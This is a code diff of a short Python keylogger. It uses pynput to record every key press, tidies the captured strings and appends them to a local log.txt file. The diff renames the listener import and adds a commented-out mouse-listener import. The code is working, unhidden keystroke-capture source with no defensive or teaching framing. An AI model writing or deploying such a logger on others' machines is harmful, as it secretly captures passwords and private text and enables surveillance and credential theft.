@@ -1,7 +1,10 @@
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener as keyb
+# from pynput.mouse import Listener as chuha
 
 def savetext(key):
     record=str(key)
+    record=record.replace("backspaceKey.","")
+    record=record.replace("backspaceiKey.","")
     record=record.replace("'","")
     record=record.replace("Key.shift","")
     record=record.replace("Key.space"," ")
@@ -10,5 +13,5 @@ def savetext(key):
     with open("log.txt","a") as f:
         f.write(record)
 
-with Listener(on_press=savetext) as k:
+with keyb(on_press=savetext) as k:
     k.join()
